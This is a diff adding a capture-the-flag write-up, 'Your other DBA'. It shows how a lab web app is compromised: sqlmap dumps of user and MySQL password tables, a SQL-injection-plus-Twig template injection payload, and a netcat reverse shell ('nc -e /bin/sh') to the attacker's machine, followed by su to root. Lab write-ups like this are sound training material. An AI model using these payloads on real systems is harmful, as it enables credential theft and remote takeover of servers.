@@ -952,3 +952,140 @@ The STMP logs revealed the flag after a few emails were received.
 ```
 :+1: FLAG{f4st_thr34t_sh4r1ng}
 <hr>
+
+### Your other DBA
+Description - Me and my friend found a suspicious looking app called easy library. It looks like its full of bugs, but my friend just couldn't get pass reading the
+database. Can you get root access on the server? 
+
+Flag format: FLAG{} 
+Access using VDI, with the target IP, 192.168.88.100
+
+Solution:
+Using sqlmap wizard, it was able to iterate the easylibrary db and reveal the contents of both tables (easylibrary and users)
+
+```
+Database: easylibrary
+Table: books
+[2 entries]
++--------------+----------------+----------------------------+-------------------------------------------------------------------------------------------+
+| title        | author         | comments                   | description                                                                               |
++--------------+----------------+----------------------------+-------------------------------------------------------------------------------------------+
+| 1984         | George Orwell  | I love this book!          | {{ title }} is a novella written by {{ author }} about totalitarian regimes               |
+| Just for fun | Linus Torvalds | A wonderful read           | {{ title }} is a biography written by {{ author }}\nabout the history of the linux kernel |
++--------------+----------------+----------------------------+-------------------------------------------------------------------------------------------+
+```
+Retrived admin password from database table users after running -
+```
+sqlmap -u http://10.107.0.11/ -D easylibrary --dump-all --batch --forms -T users
++-------------------------------+----------+
+| password                      | username |
++-------------------------------+----------+
+| uihasdjkf121122!2najksdhfkjas | admin    |
++-------------------------------+----------+
+```
+Using sqlmap, the mysql db could also be exploited. It actually had 31 tables within it but the one of interest was called
+
+```
+sqlmap -r sqlmap-request -D mysql -T user -C User --dump
+sqlmap -r sqlmap-request -D mysql -T user -C Password --dump
+
+Database: mysql
+Table: user
+[2 entries]
++-------------+---------------------------------------------------------+
+| User        | Password                                                |
++-------------+---------------------------------------------------------+
+| easylibrary | *6063C78456BB048BAF36BE1104D12D547834DFEA (easylibrary)  |
+| root        | *B9A807976C7B135C0870F1F11AAB33AB0E4D3CD9 (qwertyuiop) |
++-------------+---------------------------------------------------------+
+```
+dirsearch also proved useful to see what directories and files were present
+```
+└──╼ $dirsearch -u http://10.107.0.4
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/keiran/fifth_domain/2024_season_02/yourDBA/SSTImap/reports/http_10.107.0.4/_24-04-26_08-43-23.txt
+
+Target: http://10.107.0.4/
+
+[08:43:23] Starting:
+[08:43:27] 403 -  275B  - /.ht_wsr.txt
+[08:43:27] 403 -  275B  - /.htaccess.bak1
+[08:43:28] 403 -  275B  - /.htaccess.orig
+[08:43:28] 403 -  275B  - /.htaccess.sample
+[08:43:28] 403 -  275B  - /.htaccess_extra
+[08:43:28] 403 -  275B  - /.htaccess.save
+[08:43:28] 403 -  275B  - /.htaccess_sc
+[08:43:28] 403 -  275B  - /.htaccessBAK
+[08:43:28] 403 -  275B  - /.htaccess_orig
+[08:43:28] 403 -  275B  - /.htaccessOLD2
+[08:43:28] 403 -  275B  - /.html
+[08:43:28] 403 -  275B  - /.htaccessOLD
+[08:43:28] 403 -  275B  - /.htm
+[08:43:28] 403 -  275B  - /.htpasswds
+[08:43:28] 403 -  275B  - /.htpasswd_test
+[08:43:28] 403 -  275B  - /.httr-oauth
+[08:43:30] 403 -  275B  - /.php
+[08:44:05] 200 -   11KB - /composer.lock
+[08:44:05] 200 -   55B  - /composer.json
+[08:45:03] 403 -  275B  - /server-status
+[08:45:03] 403 -  275B  - /server-status/
+[08:45:16] 403 -  275B  - /templates/
+[08:45:16] 301 -  312B  - /templates  ->  http://10.107.0.4/templates/
+[08:45:24] 403 -  275B  - /vendor/
+[08:45:24] 200 -    0B  - /vendor/autoload.php
+[08:45:24] 200 -    0B  - /vendor/composer/autoload_classmap.php
+[08:45:24] 200 -    0B  - /vendor/composer/autoload_namespaces.php
+[08:45:24] 200 -    0B  - /vendor/composer/ClassLoader.php
+[08:45:24] 200 -    0B  - /vendor/composer/autoload_files.php
+[08:45:24] 200 -    0B  - /vendor/composer/autoload_static.php
+[08:45:24] 200 -    1KB - /vendor/composer/LICENSE
+[08:45:24] 200 -    0B  - /vendor/composer/autoload_psr4.php
+[08:45:24] 200 -   11KB - /vendor/composer/installed.json
+[08:45:24] 200 -    0B  - /vendor/composer/autoload_real.php
+```
+There were a few files to check but the composer.json file was the one of interest, it revealed that the site was using the Twig template.
+Twig can be susceptable to SSTI and referring to earlier, the books table indicated the use of twig with {{ author }}
+
+Using UNION select in the pages search field, testing for SSTI was achieved by entering
+```
+cn' UNION SELECT 'Custom Title', 'Custom Author', '{{ 7*7 }}', 'Custom Comments' AS new FROM books -- -
+```
+This returned the value of 49 in the Description column of the table on the webpage which confirmed SSTI - insert image
+
+It was then a matter of crafting a specific payload to check for system access, and then a remote shell
+The following returned the id of the www-data user
+```
+cn' UNION SELECT 'Custom Title', 'Custom Author', '{{[\'id\',\"\"]|sort(\'system\')}}', 'Custom Comments' AS new FROM books -- -
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data) - insert image
+
+From here, commands such as ls, pwd, cat /etc/passwd also worked so it was a matter of determining a payload
+
+I opted to try netcat and used the following after establishing a listerner on the kali VDI:
+```
+cn' UNION SELECT 'Custom Title', 'Custom Author', '{{[\'nc -e /bin/sh 192.168.88.2 4444\',\"\"]|sort(\'system\')}}', 'Custom Comments' AS new FROM books -- -
+```
+This gave me a simple shell.
+Once the shell is obtained, it's a few checks to ensure you're in a bash environment, then switch to root and get the flag.
+```
+--$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.88.2] from (UNKNOWN) [192.168.88.100] 40038
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+su - (then enter the root password)
+qwertyuiop
+whoami
+root
+cat /flag.txt
+FLAG{my_0ther_db_1s_your_db}
+```
+:+1: FLAG{my_0ther_db_1s_your_db}
+<hr>
